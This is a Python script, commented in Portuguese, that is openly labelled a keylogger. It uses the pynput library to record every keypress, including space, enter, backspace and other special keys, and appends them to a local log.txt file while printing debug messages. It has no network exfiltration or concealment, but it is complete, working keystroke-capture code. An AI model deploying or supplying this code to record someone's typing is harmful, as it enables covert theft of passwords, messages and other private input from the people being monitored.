from pynput import keyboard
import traceback

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        print(f"Tecla pressionada: {key}")  # Debug no console
        
        # se for uma tecla normal (letra, numero, simbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            f.flush()  # Força a escrita imediata
            print(f"Escrito: {key.char}")  # Debug
            
    except AttributeError:
        print(f"Tecla especial: {key}")  # Debug
        try:
            with open("log.txt", "a", encoding="utf-8") as f:
                if key == keyboard.Key.space:
                    f.write(" ")
                    print("Escrito: ESPAÇO")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                    print("Escrito: ENTER")
                elif key == keyboard.Key.tab:
                    f.write("\t")
                    print("Escrito: TAB")
                elif key == keyboard.Key.backspace:
                    f.write(" [BACKSPACE] ")
                    print("Escrito: [BACKSPACE]")
                elif key == keyboard.Key.esc:
                    f.write(" [ESC] ")
                    print("Escrito: [ESC]")
                elif key in IGNORAR:
                    print(f"Ignorado: {key}")
                    pass
                else:
                    f.write(f"[{key}]")
                    print(f"Escrito: [{key}]")
                f.flush()  # Força a escrita
                
        except Exception as e:
            print(f"Erro ao escrever tecla especial: {e}")
            traceback.print_exc()
            
    except Exception as e:
        print(f"Erro geral: {e}")
        traceback.print_exc()

print("Keylogger iniciado. Pressione Ctrl+C para parar.")
print("Verificando se consegue criar arquivo...")

# Teste inicial de escrita
try:
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write("\n--- Sessão Iniciada ---\n")
        f.flush()
    print("Arquivo log.txt criado/aberto com sucesso!")
except Exception as e:
    print(f"Erro ao acessar arquivo: {e}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger parado pelo usuário")
except Exception as e:
    print(f"Erro no listener: {e}")
    traceback.print_exc()
